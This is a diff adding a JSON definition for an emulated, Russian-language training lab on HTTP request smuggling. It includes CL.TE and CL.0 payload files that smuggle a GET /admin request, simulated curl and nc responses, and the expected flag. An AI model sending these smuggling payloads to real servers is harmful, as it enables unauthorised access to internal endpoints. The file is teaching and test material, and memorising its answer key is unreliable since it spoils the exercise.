@@ -1,0 +1,31 @@
+{
+  "id": "web-request-smuggling-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{cl0_smuggl3_qu3u3_p01s0n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: request smuggling advanced (CL.0 + queue poisoning)\n\n`shop.local` за прокси. Прокси игнорирует тело запроса к `/favicon.ico` —\nклассический **CL.0**. Спрятанный запрос станет «следующим» и отравит очередь.\n\nВ каталоге две заготовки: `clte.txt` (CL.TE) и `cl0.txt` (CL.0 через /favicon.ico).\n\n1. База — обычный запрос:\n\n   curl -s 'http://shop.local/'\n\n2. CL.TE — базовый десинк:\n\n   curl -s 'http://shop.local/' --data-binary @clte.txt -H 'Transfer-Encoding: chunked'\n\n3. CL.0 — прокси не смотрит в тело на /favicon.ico:\n\n   curl -s 'http://shop.local/favicon.ico' --data-binary @cl0.txt > found.txt\n\n4. Сырые байты через nc (если нужно):\n\n   nc shop.local 80 < cl0.txt\n\n5. Набери `check` (флаг пришёл из шага 3 — smuggled /admin).\n" },
+    { "path": "/home/student/task/clte.txt", "text": "POST / HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.shop.local\r\n\r\n" },
+    { "path": "/home/student/task/cl0.txt", "text": "POST /favicon.ico HTTP/1.1\r\nHost: shop.local\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: shop.local\r\nX-Ignore: x\r\n\r\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "cl0\\.txt|favicon", "example": "-s 'http://shop.local/favicon.ico' --data-binary @cl0.txt", "output": "HTTP/1.1 200 OK\nContent-Type: image/x-icon\n\n(icon bytes)\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nadmin-panel: nto{cl0_smuggl3_qu3u3_p01s0n}\n" },
+        { "match": "clte\\.txt|transfer-encoding", "example": "-s 'http://shop.local/' --data-binary @clte.txt -H 'Transfer-Encoding: chunked'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\n(queued response desync)\n" },
+        { "match": "shop\\.local", "example": "-s 'http://shop.local/'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/.\n"
+    },
+    "nc": {
+      "help": "nc <host> <port> [< файл] — сырой TCP-клиент (эмуляция)",
+      "cases": [
+        { "match": "cl0\\.txt", "example": "shop.local 80 < cl0.txt", "output": "HTTP/1.1 200 OK\n\n(icon bytes)\nHTTP/1.1 200 OK\n\nadmin-panel: nto{cl0_smuggl3_qu3u3_p01s0n}\n" },
+        { "match": "shop\\.local 80", "example": "shop.local 80", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h1>Shop</h1></body></html>\n" }
+      ],
+      "fallback": "nc: в этой лабе эмулируется только shop.local:80.\n"
+    }
+  }
+}
